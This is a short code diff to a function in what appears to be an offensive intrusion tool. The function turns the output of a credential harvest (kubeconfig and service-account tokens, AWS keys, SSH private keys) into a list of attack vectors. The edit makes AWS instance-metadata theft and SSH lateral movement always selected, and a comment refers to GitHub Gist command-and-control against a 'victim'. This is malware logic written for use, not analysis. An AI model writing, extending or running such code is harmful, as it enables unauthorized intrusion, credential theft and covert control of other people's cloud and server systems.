@@ -80,13 +80,17 @@ def parse_available_vectors(harvest_output: str) -> list[str]:
     """
     vectors = []
 
-    if any(x in harvest_output for x in ["kubeconfig", "SA token found", "kubectl"]):
-        vectors.append("k8s_enum")
+    # AWS IMDS always attempted first — high-value on cloud VMs
+    vectors.append("aws_metadata")
 
     if any(x in harvest_output for x in ["AWS_ACCESS", "aws_secret", "[HF] found"]):
         vectors.append("cloud_api_enum")
 
     if any(x in harvest_output for x in ["id_rsa found", "id_ed25519 found"]):
+        vectors.append("ssh_lateral")
+
+    # SSH lateral always available — unmanaged host is target
+    if "ssh_lateral" not in vectors:
         vectors.append("ssh_lateral")
 
     # GitHub Gist C2 always available if victim has internet
